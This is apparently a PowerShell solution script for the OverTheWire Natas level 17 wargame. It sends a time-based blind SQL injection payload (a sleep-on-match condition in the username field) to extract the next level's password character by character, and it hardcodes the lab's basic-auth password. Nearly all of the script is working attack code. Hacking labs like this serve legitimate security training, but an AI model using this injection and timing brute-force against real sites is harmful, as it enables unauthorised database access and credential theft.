#Creating character set and counter/password holder
$characters = @{}
$characters = 0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
$count = 0 
$p = ""
#Creating base64 login for basic HTTP authentication 
$user = "natas17"
$pass = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
$pair = "$user" + ":" + "$pass"
$EncodedString = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))
$basicAuthValue = "Basic $EncodedString"
#Creating HTTP Header information, pretending to be I.E.
$headers = @{}
$headers["Authorization"] = $basicAuthValue
$headers["Pragma"] = 'no-cache'


#Attempting initial connection 
try {$r = Invoke-WebRequest natas17.natas.labs.overthewire.org -Method Post -SessionVariable sv  -Headers $headers}
catch{ write-host "I couldn't connect to the site stopping program"
break;
}

#Setting SQL Injection within the username form field
$form = $r.Forms[0]

#Executing loop based on succesful requests and iterating password one letter at a time.
$parsedChars = ""

foreach($c in $characters){

$form.Fields["username"]="natas18`" AND IF(password LIKE BINARY `"%" +"$c" + "%`", sleep(5), null) `#"

write-host "I am trying " + $c
try{ $SQLIRequest = Invoke-WebRequest -Uri ("natas17.natas.labs.overthewire.org/" + $form.Action) -WebSession $sv -Method Post -Body $form.Fields -Headers $headers -TimeoutSec 1
write-host "That character didn't work moving on"
}
catch{
$parsedChars += $c
write-host "Character successful parsed so far is $parsedChars"

 }
 
}

write-host "Characters parsed. Starting Brute Force!!!!"

while($count -le $parsedChars.ToCharArray().count){

try{
$form.Fields["username"]="natas18`" AND IF(password LIKE BINARY `"" + $p + $parsedChars.ToCharArray()[$count]  + "%`", sleep(5), null) `#"
write-host "Trying " + $parsedChars.ToCharArray()[$count]
$SQLParseRequest = Invoke-WebRequest -Uri ("natas17.natas.labs.overthewire.org/" + $form.Action) -WebSession $sv -Method Post -Body $form.Fields -Headers $headers -TimeoutSec 1
$count++
}

catch{ 
$p = $p + $parsedChars[$count]
write-host "Character found, password so far is " + $p
$count = 0
if($p.Length -eq 32){break;}

}





}